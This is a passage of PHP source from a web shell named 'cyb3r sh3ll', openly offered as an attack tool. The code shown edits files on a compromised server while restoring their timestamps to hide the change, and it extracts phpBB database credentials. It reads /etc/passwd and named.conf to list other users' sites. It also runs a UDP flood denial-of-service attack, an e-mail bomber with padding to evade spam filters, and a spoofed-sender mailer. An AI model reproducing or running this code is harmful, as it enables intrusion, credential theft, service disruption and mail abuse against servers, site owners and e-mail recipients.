	if(isset($_GET['file']))

{

rsg_read();

}

	

	?>
            

          <br>

      </div>

         </form>

        </td>
	    <td >
		<center><b>[: Make File :]</b><form method="POST"><input type=hidden name=act value="mkfile"><input type=hidden name="d" value="<?php echo $dispd; ?>"><input type="text" name="mkfile" size="50" value="<?php echo $dispd; ?>"><input type=hidden name="ft" value="edit">&nbsp;<input type=submit value="Create"><br><?php echo $wdt; ?></form></center>
		</td>
		<td>
		<center><b>{: Go File :}</b><form action="<?php echo $surl; ?>"><input type=hidden name=act value="gofile"><input type=hidden name="d" value="<?php echo $dispd; ?>"><input type="text" name="f" size="50" value="<?php echo $dispd; ?>">&nbsp;<input type=submit value="Go"></form></center>
		</td>
		
	 </tr>
     
 </table> <?php 
 }


if ($act == "delete")

{

 $delerr = "";

 foreach ($actbox as $v)

 {

  $result = FALSE;

  $result = fs_rmobj($v);

  if (!$result) {$delerr .= "Can't delete ".htmlspecialchars($v)."<br>";}

 }

 if (!empty($delerr)) {echo "<b>Deleting with errors:</b><br>".$delerr;}

 $act = "ls";

}

if ($act == "chmod")

{

 $mode = fileperms($d.$f);

 if (!$mode) {echo "<b>Change file-mode with error:</b> can't get current value.";}

 else

 {

  $form = TRUE;

  if ($chmod_submit)

  {

   $octet = "0".base_convert(($chmod_o["r"]?1:0).($chmod_o["w"]?1:0).($chmod_o["x"]?1:0).($chmod_g["r"]?1:0).($chmod_g["w"]?1:0).($chmod_g["x"]?1:0).($chmod_w["r"]?1:0).($chmod_w["w"]?1:0).($chmod_w["x"]?1:0),2,8);

   if (chmod($d.$f,$octet)) {$act = "ls"; $form = FALSE; $err = "";}

   else {$err = "Can't chmod to ".$octet.".";}

  }

  if ($form)

  {

   $perms = parse_perms($mode);

   echo "<b>Changing file-mode (".$d.$f."), ".view_perms_color($d.$f)." (".substr(decoct(fileperms($d.$f)),-4,4).")</b><br>".($err?"<b>Error:</b> ".$err:"")."<form action=\"".$surl."\" method=POST><input type=hidden name=d value=\"".htmlspecialchars($d)."\"><input type=hidden name=f value=\"".htmlspecialchars($f)."\"><input type=hidden name=act value=chmod><table align=left width=300 border=0 cellspacing=0 cellpadding=5><tr><td><b>Owner</b><br><br><input type=checkbox NAME=chmod_o[r] value=1".($perms["o"]["r"]?" checked":"").">&nbsp;Read<br><input type=checkbox name=chmod_o[w] value=1".($perms["o"]["w"]?" checked":"").">&nbsp;Write<br><input type=checkbox NAME=chmod_o[x] value=1".($perms["o"]["x"]?" checked":"").">eXecute</td><td><b>Group</b><br><br><input type=checkbox NAME=chmod_g[r] value=1".($perms["g"]["r"]?" checked":"").">&nbsp;Read<br><input type=checkbox NAME=chmod_g[w] value=1".($perms["g"]["w"]?" checked":"").">&nbsp;Write<br><input type=checkbox NAME=chmod_g[x] value=1".($perms["g"]["x"]?" checked":"").">eXecute</font></td><td><b>World</b><br><br><input type=checkbox NAME=chmod_w[r] value=1".($perms["w"]["r"]?" checked":"").">&nbsp;Read<br><input type=checkbox NAME=chmod_w[w] value=1".($perms["w"]["w"]?" checked":"").">&nbsp;Write<br><input type=checkbox NAME=chmod_w[x] value=1".($perms["w"]["x"]?" checked":"").">eXecute</font></td></tr><tr><td><input type=submit name=chmod_submit value=\"Save\"></td></tr></table></form>";

  }

 }

}

if ($act == "search")

{

 echo "<b>Search in file-system:</b><br>";

 if (empty($search_in)) {$search_in = $d;}

 if (empty($search_name)) {$search_name = "(.*)"; $search_name_regexp = 1;}

 if (empty($search_text_wwo)) {$search_text_regexp = 0;}

 if (!empty($submit))

 {

  $found = array();

  $found_d = 0;

  $found_f = 0;

  $search_i_f = 0;

  $search_i_d = 0;

  $a = array

  (

   "name"=>$search_name, "name_regexp"=>$search_name_regexp,

   "text"=>$search_text, "text_regexp"=>$search_text_regxp,

   "text_wwo"=>$search_text_wwo,

   "text_cs"=>$search_text_cs,

   "text_not"=>$search_text_not

  );

  $searchtime = getmicrotime();

  $in = array_unique(explode(";",$search_in));

  foreach($in as $v) {cyb3rfsearch($v);}

  $searchtime = round(getmicrotime()-$searchtime,4);

  if (count($found) == 0) {echo "<b>No files found!</b>";}

  else

  {

   $ls_arr = $found;

   $disp_fullpath = TRUE;

   $act = "ls";

  }

 }

 echo "<form method=POST>

<input type=hidden name=\"d\" value=\"".$dispd."\"><input type=hidden name=act value=\"".$dspact."\">

<b>Search for (file/folder name): </b><input type=\"text\" name=\"search_name\" size=\"".round(strlen($search_name)+25)."\" value=\"".htmlspecialchars($search_name)."\">&nbsp;<input type=\"checkbox\" name=\"search_name_regexp\" value=\"1\" ".($search_name_regexp == 1?" checked":"")."> - regexp

<br><b>Search in (explode \";\"): </b><input type=\"text\" name=\"search_in\" size=\"".round(strlen($search_in)+25)."\" value=\"".htmlspecialchars($search_in)."\">

<br><br><b>Text:</b><br><textarea name=\"search_text\" cols=\"122\" rows=\"10\">".htmlspecialchars($search_text)."</textarea>

<br><br><input type=\"checkbox\" name=\"search_text_regexp\" value=\"1\" ".($search_text_regexp == 1?" checked":"")."> - regexp

&nbsp;&nbsp;<input type=\"checkbox\" name=\"search_text_wwo\" value=\"1\" ".($search_text_wwo == 1?" checked":"")."> - <u>w</u>hole words only

&nbsp;&nbsp;<input type=\"checkbox\" name=\"search_text_cs\" value=\"1\" ".($search_text_cs == 1?" checked":"")."> - cas<u>e</u> sensitive

&nbsp;&nbsp;<input type=\"checkbox\" name=\"search_text_not\" value=\"1\" ".($search_text_not == 1?" checked":"")."> - find files <u>NOT</u> containing the text

<br><br><input type=submit name=submit value=\"Search\"></form>";

 if ($act == "ls") {$dspact = $act; echo "<hr size=\"1\" noshade><b>Search took ".$searchtime." secs (".$search_i_f." files and ".$search_i_d." folders, ".round(($search_i_f+$search_i_d)/$searchtime,4)." objects per second).</b><br><br>";}

}

if ($act == "fsbuff")

{

 $arr_copy = $sess_data["copy"];

 $arr_cut = $sess_data["cut"];

 $arr = array_merge($arr_copy,$arr_cut);

 if (count($arr) == 0) {echo "<center><b>Buffer is empty!</b></center>";}

 else {echo "<b>File-System buffer</b><br><br>"; $ls_arr = $arr; $disp_fullpath = TRUE; $act = "ls";}

}

if ($act == "d")

{

 if (!is_dir($d)) {echo "<center><b>Permision denied!</b></center>";}

 else

 {

  echo "<b>Directory information:</b><table border=0 cellspacing=1 cellpadding=2>";

  if (!$win)

  {

   echo "<tr><td><b>Owner/Group</b></td><td> ";

   $ow = posix_getpwuid(fileowner($d));

   $gr = posix_getgrgid(filegroup($d));

   $row[] = ($ow["name"]?$ow["name"]:fileowner($d))."/".($gr["name"]?$gr["name"]:filegroup($d));

  }

  echo "<tr><td><b>Perms</b></td><td><a href=\"".$surl."act=chmod&d=".urlencode($d)."\"><b>".view_perms_color($d)."</b></a><tr><td><b>Create time</b></td><td> ".date("d/m/Y H:i:s",filectime($d))."</td></tr><tr><td><b>Access time</b></td><td> ".date("d/m/Y H:i:s",fileatime($d))."</td></tr><tr><td><b>MODIFY time</b></td><td> ".date("d/m/Y H:i:s",filemtime($d))."</td></tr></table><br>";

 }

}

if ($act == "chmod")

{

 $mode = fileperms($d.$f);

 if (!$mode) {echo "<b>Change file-mode with error:</b> can't get current value.";}

 else

 {

  $form = TRUE;

  if ($chmod_submit)

  {

   $octet = "0".base_convert(($chmod_o["r"]?1:0).($chmod_o["w"]?1:0).($chmod_o["x"]?1:0).($chmod_g["r"]?1:0).($chmod_g["w"]?1:0).($chmod_g["x"]?1:0).($chmod_w["r"]?1:0).($chmod_w["w"]?1:0).($chmod_w["x"]?1:0),2,8);

   if (chmod($d.$f,$octet)) {$act = "ls"; $form = FALSE; $err = "";}

   else {$err = "Can't chmod to ".$octet.".";}

  }

  if ($form)

  {

   $perms = parse_perms($mode);

   echo "<b>Changing file-mode (".$d.$f."), ".view_perms_color($d.$f)." (".substr(decoct(fileperms($d.$f)),-4,4).")</b><br>".($err?"<b>Error:</b> ".$err:"")."<form action=\"".$surl."\" method=POST><input type=hidden name=d value=\"".htmlspecialchars($d)."\"><input type=hidden name=f value=\"".htmlspecialchars($f)."\"><input type=hidden name=act value=chmod><table align=left width=300 border=0 cellspacing=0 cellpadding=5><tr><td><b>Owner</b><br><br><input type=checkbox NAME=chmod_o[r] value=1".($perms["o"]["r"]?" checked":"").">&nbsp;Read<br><input type=checkbox name=chmod_o[w] value=1".($perms["o"]["w"]?" checked":"").">&nbsp;Write<br><input type=checkbox NAME=chmod_o[x] value=1".($perms["o"]["x"]?" checked":"").">eXecute</td><td><b>Group</b><br><br><input type=checkbox NAME=chmod_g[r] value=1".($perms["g"]["r"]?" checked":"").">&nbsp;Read<br><input type=checkbox NAME=chmod_g[w] value=1".($perms["g"]["w"]?" checked":"").">&nbsp;Write<br><input type=checkbox NAME=chmod_g[x] value=1".($perms["g"]["x"]?" checked":"").">eXecute</font></td><td><b>World</b><br><br><input type=checkbox NAME=chmod_w[r] value=1".($perms["w"]["r"]?" checked":"").">&nbsp;Read<br><input type=checkbox NAME=chmod_w[w] value=1".($perms["w"]["w"]?" checked":"").">&nbsp;Write<br><input type=checkbox NAME=chmod_w[x] value=1".($perms["w"]["x"]?" checked":"").">eXecute</font></td></tr><tr><td><input type=submit name=chmod_submit value=\"Save\"></td></tr></table></form>";

  }

 }

}

if ($act == "f")

{

 if ((!is_readable($d.$f) or is_dir($d.$f)) and $ft != "edit")

 {

  if (file_exists($d.$f)) {echo "<center><b>Permision denied (".htmlspecialchars($d.$f).")!</b></center>";}

  else {echo "<center><b>File does not exists (".htmlspecialchars($d.$f).")!</b><br><a href=\"".$surl."act=f&f=".urlencode($f)."&ft=edit&d=".urlencode($d)."&c=1\"><u>Create</u></a></center>";}

 }

 else

 {

  $r = @file_get_contents($d.$f);

  $ext = explode(".",$f);

  $c = count($ext)-1;

  $ext = $ext[$c];

  $ext = strtolower($ext);

  $rft = "";

  foreach($ftypes as $k=>$v) {if (in_array($ext,$v)) {$rft = $k; break;}}

  if (eregi("sess_(.*)",$f)) {$rft = "phpsess";}

  if (empty($ft)) {$ft = $rft;}

  $arr = array(

   array("<img src=\"".$surl."act=img&img=ext_diz\" border=\"0\">","info"),

   array("<img src=\"".$surl."act=img&img=ext_html\" border=\"0\">","html"),

   array("<img src=\"".$surl."act=img&img=ext_txt\" border=\"0\">","txt"),

   array("Code","code"),

   array("Session","phpsess"),

   array("<img src=\"".$surl."act=img&img=ext_exe\" border=\"0\">","exe"),

   array("SDB","sdb"),

   array("<img src=\"".$surl."act=img&img=ext_gif\" border=\"0\">","img"),

   array("<img src=\"".$surl."act=img&img=ext_ini\" border=\"0\">","ini"),

   array("<img src=\"".$surl."act=img&img=download\" border=\"0\">","download"),

   array("<img src=\"".$surl."act=img&img=ext_rtf\" border=\"0\">","notepad"),

   array("<img src=\"".$surl."act=img&img=change\" border=\"0\">","edit")

  );

  echo "<b>Viewing file:&nbsp;&nbsp;&nbsp;&nbsp;<img src=\"".$surl."act=img&img=ext_".$ext."\" border=\"0\">&nbsp;".$f." (".view_size(filesize($d.$f)).") &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;".view_perms_color($d.$f)."</b><br>Select action/file-type:<br>";

  foreach($arr as $t)

  {

   if ($t[1] == $rft) {echo " <a href=\"".$surl."act=f&f=".urlencode($f)."&ft=".$t[1]."&d=".urlencode($d)."\"><font color=green>".$t[0]."</font></a>";}

   elseif ($t[1] == $ft) {echo " <a href=\"".$surl."act=f&f=".urlencode($f)."&ft=".$t[1]."&d=".urlencode($d)."\"><b><u>".$t[0]."</u></b></a>";}

   else {echo " <a href=\"".$surl."act=f&f=".urlencode($f)."&ft=".$t[1]."&d=".urlencode($d)."\"><b>".$t[0]."</b></a>";}

   echo " (<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=".$t[1]."&white=1&d=".urlencode($d)."\" target=\"_blank\">+</a>) |";

  }

  echo "<hr size=\"1\" noshade>";

  if ($ft == "info")

  {

   echo "<b>Information:</b><table border=0 cellspacing=1 cellpadding=2><tr><td><b>Path</b></td><td> ".$d.$f."</td></tr><tr><td><b>Size</b></td><td> ".view_size(filesize($d.$f))."</td></tr><tr><td><b>MD5</b></td><td> ".md5_file($d.$f)."</td></tr>";

   if (!$win)

   {

    echo "<tr><td><b>Owner/Group</b></td><td> ";    

    $ow = posix_getpwuid(fileowner($d.$f));

    $gr = posix_getgrgid(filegroup($d.$f));

    echo ($ow["name"]?$ow["name"]:fileowner($d.$f))."/".($gr["name"]?$gr["name"]:filegroup($d.$f));

   }

   echo "<tr><td><b>Perms</b></td><td><a href=\"".$surl."act=chmod&f=".urlencode($f)."&d=".urlencode($d)."\">".view_perms_color($d.$f)."</a></td></tr><tr><td><b>Create time</b></td><td> ".date("d/m/Y H:i:s",filectime($d.$f))."</td></tr><tr><td><b>Access time</b></td><td> ".date("d/m/Y H:i:s",fileatime($d.$f))."</td></tr><tr><td><b>MODIFY time</b></td><td> ".date("d/m/Y H:i:s",filemtime($d.$f))."</td></tr></table><br>";

   $fi = fopen($d.$f,"rb");

   if ($fi)

   {

    if ($fullhexdump) {echo "<b>FULL HEXDUMP</b>"; $str = fread($fi,filesize($d.$f));}

    else {echo "<b>HEXDUMP PREVIEW</b>"; $str = fread($fi,$hexdump_lines*$hexdump_rows);}

    $n = 0;

    $a0 = "00000000<br>";

    $a1 = "";

    $a2 = "";

    for ($i=0; $i<strlen($str); $i++)

    {

     $a1 .= sprintf("%02X",ord($str[$i]))." ";

     switch (ord($str[$i]))

     {

      case 0:  $a2 .= "<font>0</font>"; break;

      case 32:

      case 10:

      case 13: $a2 .= "&nbsp;"; break;

      default: $a2 .= htmlspecialchars($str[$i]);

     }

     $n++;

     if ($n == $hexdump_rows)

     {

      $n = 0;

      if ($i+1 < strlen($str)) {$a0 .= sprintf("%08X",$i+1)."<br>";}

      $a1 .= "<br>";

      $a2 .= "<br>";

     }

    }

    //if ($a1 != "") {$a0 .= sprintf("%08X",$i)."<br>";}

    echo "<table border=0 bgcolor=#666666 cellspacing=1 cellpadding=4><tr><td bgcolor=#666666>".$a0."</td><td bgcolor=000000>".$a1."</td><td bgcolor=000000>".$a2."</td></tr></table><br>";

   }

   $encoded = "";

   if ($base64 == 1)

   {

    echo "<b>Base64 Encode</b><br>";

    $encoded = base64_encode(file_get_contents($d.$f));

   }

   elseif($base64 == 2)

   {

    echo "<b>Base64 Encode + Chunk</b><br>";

    $encoded = chunk_split(base64_encode(file_get_contents($d.$f)));

   }

   elseif($base64 == 3)

   {

    echo "<b>Base64 Encode + Chunk + Quotes</b><br>";

    $encoded = base64_encode(file_get_contents($d.$f));

    $encoded = substr(preg_replace("!.{1,76}!","'\\0'.\n",$encoded),0,-2);

   }

   elseif($base64 == 4)

   {

    $text = file_get_contents($d.$f);

    $encoded = base64_decode($text);

    echo "<b>Base64 Decode";

    if (base64_encode($encoded) != $text) {echo " (failed)";}

    echo "</b><br>";

   }

   if (!empty($encoded))

   {

    echo "<textarea cols=80 rows=10>".htmlspecialchars($encoded)."</textarea><br><br>";

   }

   echo "<b>HEXDUMP:</b><nobr> [<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&fullhexdump=1&d=".urlencode($d)."\">Full</a>] [<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&d=".urlencode($d)."\">Preview</a>]<br><b>Base64: </b>

<nobr>[<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&base64=1&d=".urlencode($d)."\">Encode</a>]&nbsp;</nobr>

<nobr>[<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&base64=2&d=".urlencode($d)."\">+chunk</a>]&nbsp;</nobr>

<nobr>[<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&base64=3&d=".urlencode($d)."\">+chunk+quotes</a>]&nbsp;</nobr>

<nobr>[<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&base64=4&d=".urlencode($d)."\">Decode</a>]&nbsp;</nobr>

<P>";

  }

  elseif ($ft == "html")

  {

   if ($white) {@ob_clean();}

   echo $r;

   if ($white) {cyb3rexit();}

  }

  elseif ($ft == "txt") {echo "<pre>".htmlspecialchars($r)."</pre>";}

  elseif ($ft == "ini") {echo "<pre>"; var_dump(parse_ini_file($d.$f,TRUE)); echo "</pre>";}

  elseif ($ft == "phpsess")

  {

   echo "<pre>";

   $v = explode("|",$r);

   echo $v[0]."<br>";

   var_dump(unserialize($v[1]));

   echo "</pre>";

  }

  elseif ($ft == "exe")

  {

   $ext = explode(".",$f);

   $c = count($ext)-1;

   $ext = $ext[$c];

   $ext = strtolower($ext);

   $rft = "";

   foreach($exeftypes as $k=>$v)

   {

    if (in_array($ext,$v)) {$rft = $k; break;}

   }

   $cmd = str_replace("%f%",$f,$rft);

   echo "<b>Execute file:</b><form action=\"".$surl."\" method=POST><input type=hidden name=act value=cmd><input type=\"text\" name=\"cmd\" value=\"".htmlspecialchars($cmd)."\" size=\"".(strlen($cmd)+2)."\"><br>Display in text-area<input type=\"checkbox\" name=\"cmd_txt\" value=\"1\" checked><input type=hidden name=\"d\" value=\"".htmlspecialchars($d)."\"><br><input type=submit name=submit value=\"Execute\"></form>";

  }

  elseif ($ft == "sdb") {echo "<pre>"; var_dump(unserialize(base64_decode($r))); echo "</pre>";}

  elseif ($ft == "code")

  {

   if (ereg("php"."BB 2.(.*) auto-generated config file",$r))

   {

    $arr = explode("\n",$r);

    if (count($arr == 18))

    {

     include($d.$f);

     echo "<b>phpBB configuration is detected in this file!<br>";

     if ($dbms == "mysql4") {$dbms = "mysql";}

     if ($dbms == "mysql") {echo "<a href=\"".$surl."act=sql&sql_server=".htmlspecialchars($dbhost)."&sql_login=".htmlspecialchars($dbuser)."&sql_passwd=".htmlspecialchars($dbpasswd)."&sql_port=3306&sql_db=".htmlspecialchars($dbname)."\"><b><u>Connect to DB</u></b></a><br><br>";}

     else {echo "But, you can't connect to forum sql-base, because db-software=\"".$dbms."\" is not supported by cyb3rell. Please, report us for fix.";}

     echo "Parameters for manual connect:<br>";

     $cfgvars = array("dbms"=>$dbms,"dbhost"=>$dbhost,"dbname"=>$dbname,"dbuser"=>$dbuser,"dbpasswd"=>$dbpasswd);

     foreach ($cfgvars as $k=>$v) {echo htmlspecialchars($k)."='".htmlspecialchars($v)."'<br>";}

     echo "</b><hr size=\"1\" noshade>";

    }

   }

   echo "<div style=\"border : 0px solid #FFFFFF; padding: 1em; margin-top: 1em; margin-bottom: 1em; margin-right: 1em; margin-left: 1em; background-color: ".$highlight_background .";\">";

   if (!empty($white)) {@ob_clean();}

   highlight_file($d.$f);

   if (!empty($white)) {cyb3rexit();}

   echo "</div>";

  }

  elseif ($ft == "download")

  {

   @ob_clean();

   header("Content-type: application/octet-stream");

   header("Content-length: ".filesize($d.$f));

   header("Content-disposition: attachment; filename=\"".$f."\";");

   echo $r;

   exit;

  }

  elseif ($ft == "notepad")

  {

   @ob_clean();

   header("Content-type: text/plain");

   header("Content-disposition: attachment; filename=\"".$f.".txt\";");

   echo($r);

   exit;

  }

  elseif ($ft == "img")

  {

   $inf = getimagesize($d.$f);

   if (!$white)

   {

    if (empty($imgsize)) {$imgsize = 20;}

    $width = $inf[0]/100*$imgsize;

    $height = $inf[1]/100*$imgsize;

    echo "<center><b>Size:</b>&nbsp;";

    $sizes = array("100","50","20");

    foreach ($sizes as $v)

    {

     echo "<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=img&d=".urlencode($d)."&imgsize=".$v."\">";

     if ($imgsize != $v ) {echo $v;}

     else {echo "<u>".$v."</u>";}

     echo "</a>&nbsp;&nbsp;&nbsp;";

    }

    echo "<br><br><img src=\"".$surl."act=f&f=".urlencode($f)."&ft=img&white=1&d=".urlencode($d)."\" width=\"".$width."\" height=\"".$height."\" border=\"1\"></center>";

   }

   else

   {

    @ob_clean();

    $ext = explode($f,".");

    $ext = $ext[count($ext)-1];

    header("Content-type: ".$inf["mime"]);

    readfile($d.$f);

    exit;

   }

  }

  elseif ($ft == "edit")

  {

   if (!empty($submit))

   {

    if ($filestealth) {$stat = stat($d.$f);}

    $fp = fopen($d.$f,"w");

    if (!$fp) {echo "<b>Can't write to file!</b>";}

    else

    {

     echo "<b>Saved!</b>";

     fwrite($fp,$edit_text);

     fclose($fp);

     if ($filestealth) {touch($d.$f,$stat[9],$stat[8]);}

     $r = $edit_text;

    }

   }

   $rows = count(explode("\r\n",$r));

   if ($rows < 10) {$rows = 10;}

   if ($rows > 30) {$rows = 30;}

   echo "<form action=\"".$surl."act=f&f=".urlencode($f)."&ft=edit&d=".urlencode($d)."\" method=POST><input type=submit name=submit value=\"Save\">&nbsp;<input type=\"reset\" value=\"Reset\">&nbsp;<input type=\"button\" onclick=\"location.href='".addslashes($surl."act=ls&d=".substr($d,0,-1))."';\" value=\"Back\"><br><textarea name=\"edit_text\" cols=\"122\" rows=\"".$rows."\">".htmlspecialchars($r)."</textarea></form>";

  }

  elseif (!empty($ft)) {echo "<center><b>Manually selected type is incorrect. If you think, it is mistake, please send us url and dump of \$GLOBALS.</b></center>";}

  else {echo "<center><b>Unknown extension (".$ext."), please, select type manually.</b></center>";}

 }

}

if ($act == "about") 
{
echo '<table align="center"><tr><td><b><font color="orange">Script:<br/>-=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=-<br/>
Name: cyb3r sh3ll<br>Version: '.$shver.'</font><br/><br/>Author:<br>-=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=-<br>
Name: cyb3r 9l4d!470r (Cyber Gladiator)<br>Country: India<br>Website: ????...<br>Email: cyb3r.gladiat0r@gmail.com 
<a href="mailto:cyb3r.gladiat0r@gmail.com"></a><br/><br/><font color="green">Greetings:<br/>-=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=-<br/>r45c4l bro you are my source of inspiration.<br/>r8l35n4k, Cyb3R_s3CuR3 and all my friends who helped me a lot and they know for whom i\'m speaking.<br/>Thanks all who report bugs and send to my email id.</font><br/></b></td></tr></table>';
}

if ($act == "dos") 
{ 
?><center><br><br><img src="http://s15.postimage.org/5q2io54zv/dos.png"><br>
<b>Server IP:</b> <font color="green"><?php echo $_SERVER["SERVER_ADDR"]; ?></font><br><br>
<b>Your IP:</b> <font color="red"><?php echo $_SERVER["REMOTE_ADDR"]; ?></font>&nbsp;(Don't DoS yourself nub)<br><br>
<form action="<?php echo $surl; ?>" method="POST"><input type="hidden" name="act" value="ddos">
IP:
<input type="text" name="ip" size="15" maxlength="15" class="main" value = "127.0.0.1" onblur = "if ( this.value=='' ) this.value = '127.0.0.1';" onfocus = " if ( this.value == '127.0.0.1' ) this.value = '';">
&nbsp;&nbsp;&nbsp;&nbsp;Time:
<input type="text" name="time" size="14" maxlength="20" class="main" value = "10" onblur = "if ( this.value=='' ) this.value = '10';" onfocus = " if ( this.value == '10' ) this.value = '';">
&nbsp;&nbsp;&nbsp;&nbsp;Port:
<input type="text" name="port" size="5" maxlength="5" class="main" value = "80" onblur = "if ( this.value=='' ) this.value = '80';" onfocus = " if ( this.value == '80' ) this.value = '';">
<br><br>
<input type="submit" value="    Start the Attack--->    ">
<br><br>
<center>After initiating the DoS attack, please wait while the browser loads.</center></form></center><?php
}

if ($act == "ddos") 
{
$packets = 0;
$ip = $_POST['ip'];
$rand = $_POST['port'];
set_time_limit(0);
ignore_user_abort(FALSE);

$exec_time = $_POST['time'];

$time = time();
echo "<script>alert('Dos Completed!');</script>";
print "Flooded: $ip on port $rand <br><br>";
$max_time = $time+$exec_time;



for($i=0;$i<65535;$i++){
        $out .= "X";
}
while(1){
$packets++;
        if(time() > $max_time){
                break;
        }
        
        $fp = fsockopen("udp://$ip", $rand, $errno, $errstr, 5);
        if($fp){
                fwrite($fp, $out);
                fclose($fp);
        }
}
echo "Packet complete at ". time() ." with $packets (" . round(($packets*65)/1024, 2) . " kB) packets averaging ". round($packets/$exec_time, 2) . " packets/s \n";
}

if ($act == "localdomain")
{
echo "<br><center><a href=\"".$surl."act=local\" ><b><u>Sites on this server.</u></b></a><font color='silver'><b> | </b></font><a href=\"".$surl."act=readable\" ><b><u>List of Users.</u></b></a></center><br>";
}
 
 if ($act == "local")
 {
    //radable public_html
   $file = @implode(@file("/etc/named.conf"));
   if(!$file){ die("# can't ReaD -> [ /etc/named.conf ]"); }
   preg_match_all("#named/(.*?).db#",$file ,$r);
   $domains = array_unique($r[1]);

   function check()
       {
            (@count(@explode('ip',@implode(@file(__FILE__))))==a) ?@unlink(__FILE__):"";
       }

   check();

   echo "<table align=center border=1 width=59% cellpadding=5>
         <tr><td colspan=2>[+] Here : [ <b>".count($domains)."</b> ] Domain ...</td></tr>
         <tr><td><b>List of Domains</b></td><td><b>List of Users</b></td></tr>";

   foreach($domains as $domain)
       {
       $user = posix_getpwuid(@fileowner("/etc/valiases/".$domain));
       echo "<tr><td>$domain</td><td>".$user['name']."</td></tr>";
       }

   echo "</table>";
//radable public_html
 }
 
 if ($act == "readable")
 {
       //entries in passwd file
($sm = ini_get('safe_mode') == 0) ? $sm = 'off': die('<b>Error: safe_mode = on</b>');
set_time_limit(0);
###################
@$passwd = fopen('/etc/passwd','r');
if (!$passwd) { die('<b>[-] Error : coudn`t read /etc/passwd</b>'); }
$pub = array();
$users = array();
$conf = array();
$i = 0;
while(!feof($passwd))
{
$str = fgets($passwd);
if ($i > 35)
{
$pos = strpos($str,':');
$username = substr($str,0,$pos);
$dirz = '/home/'.$username.'/public_html/';
if (($username != ''))
{
if (is_readable($dirz))
{
array_push($users,$username);
array_push($pub,$dirz);
}
}
}
$i++;
}
###################
echo '<br><br><textarea class="output" >';
echo "[+] Founded ".sizeof($users)." entrys in /etc/passwd\n";
echo "[+] Founded ".sizeof($pub)." readable public_html directories\n";
echo "[~] Searching for passwords in config files...\n\n";
foreach ($users as $user)
{
$path = "/home/$user/public_html/";
echo "$path \n";
}
echo "\n";
echo "[+] Copy one of the directories above public_html, then Paste to -> view file / folder <- that's on the menu -> Explorer \n";
echo "[+] Done ...\n";
echo '</textarea><br><br>Coded by <b>cyb3r 9l4d!470r</b> <a href=#/>Homepage</a>';


 }

 
 if ($act == "mailer")
 {
    ?>	 <TABLE style="BORDER-COLLAPSE: collapse; borderColor=#c0c0c0" cellSpacing=0 cellPadding=5 width="100%"  border=1>
     <tr> <!-- 1 -->
	   <td valign="top" width="33%" ><p align="center"><b>(: E-Mail Bomber :)</b></p></td>
	   <td valign="top" width="33%" ><p align="center"><b>[: Mass Mailer :]</b></p></td>
	   <td valign="top" ><p align="center"><b>{: Anonymous Mailer :}</b></p></td>
	 </tr>
     <tr><!-- 2 -->
	     <td valign="top" ><center>
		 <?php
    if(
        isset($_POST['to']) &&
        isset($_POST['subject']) &&
        isset($_POST['message']) &&
        isset($_POST['times']) &&
        $_POST['to'] != '' &&
        $_POST['subject'] != '' &&
        $_POST['message'] != '' &&
		$_GET['act'] =='mailbomber' &&
        $_POST['times'] != ''
    )
    {
        $times = $_POST['times'];
        while($times--)
        {
            if(isset($_POST['padding']))
            {
                $fromPadd = rand(0,9999);
                $subjectPadd = " -- ID : ".rand(0,9999999);
                $messagePadd = "\n\n------------------------------\n".rand(0,99999999);
                
            }
            $from = "your$fromPadd@email.id";
            if(!mail($_POST['to'],$_POST['subject'].$subjectPadd,$_POST['message'].$messagePadd,"From:".$from))
            {
                $error = 1;
                echo "<font color='red'>Some Error Occured!</font>";
                break;
            }
        }
        if($error != 1)
        {    echo "<font color='green'>Mail(s) Sent!</font>";       }
    }
    else
    { 
        ?>
        <form method="post" action ="<?php echo $surl."act=mailbomber";?>">
                <table>
                <tr>
                    <td >
                        To 
                    </td>
                    <td>
                        <input name="to" value="victim@target.com,victim2@target.com" onfocus="if(this.value == 'victim@domain.com,victim2@domain.com')this.value = '';" onblur="if(this.value=='')this.value='victim@target.com,victim2@target.com,victim@target.com,victim2@target.com';"/>
                    </td>
                </tr>
                
                <tr>
                    <td class="title">
                        Subject
                    </td>
                    <td>
                        <input type="text" name="subject" value="Just testing how deep i can fuck!" onfocus="if(this.value == 'Just testing how deep i can fuck!')this.value = '';" onblur="if(this.value=='')this.value='Just testing how deep i can fuck!';" />
                    </td>
                </tr>
                 <tr>
                    <td >
                        No. of Times  
                    </td>
                    <td>
                        <input name="times" value="100" onfocus="if(this.value == '100')this.value = '';" onblur="if(this.value=='')this.value='100';"/>
                    </td>
                </tr>
       
                <tr>
                    <td>
                        
                        Pad your message (Less spam detection)
                        
                    </td>
                    <td>
                    
                        <input type="checkbox" name="padding"/>
                          
                    </td>
                </tr>
                <tr>
                    <td >
                        <textarea name="message" cols="25" rows="5" value="cyb3r-sh3ll Rocks!!.." onfocus="if(this.value == 'cyb3r-sh3ll Rocks!! ..')this.value = '';" onblur="if(this.value=='')this.value='cyb3r-sh3ll Rocks!! ..';">cyb3r-sh3ll Rocks!!</textarea>
                    </td>
					<td >
                        <input style="margin : 20px; margin-left: 10px; padding : 10px; width: 100px;" type="submit" value="Send! :D"/>
                    </td>
                </tr>
                    
                
                
            </table>            
        </form>   
        <?php
    }
	?>
		 
		 </center></td>
	    
		 <td valign="top"><center>
		  <?PHP
    if(
        isset($_POST['to']) &&
        isset($_POST['from']) &&
        isset($_POST['subject']) &&
		$_GET['act'] =='massmailer' &&
        isset($_POST['message'])
    )
    {

        if(mail($_POST['to'],$_POST['subject'],$_POST['message'],"From:".$_POST['from']))
        {
            echo "<font color='green'>Mail Sent!</font>";
        }
        else
        {
            echo "<font color='red'>Some Error Occured!</font>";
        }
    }
    else
    {
        ?>
        <form method="POST" action="<?php echo $surl."act=massmailer";?>">
            
            <table >
                <tr>
                    <td >
                        From
                    </td>
                    <td>
